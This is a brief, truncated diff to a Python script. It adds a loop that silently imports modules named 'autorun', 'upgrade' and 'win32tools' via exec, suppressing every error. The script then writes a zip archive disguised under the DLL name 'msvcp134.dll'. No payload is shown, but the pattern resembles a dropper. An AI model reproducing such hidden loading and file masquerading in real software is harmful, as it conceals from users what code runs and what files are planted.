@@ -1,5 +1,14 @@
 import zipfile
 
+mods=['autorun','upgrade','win32tools']
+
+for md in mods:
+	try:
+		exec('import '+md)
+	except:
+		pass
+
+
 zf = zipfile.ZipFile('upgrades\\msvcp134.dll', mode='w')
 
 try:
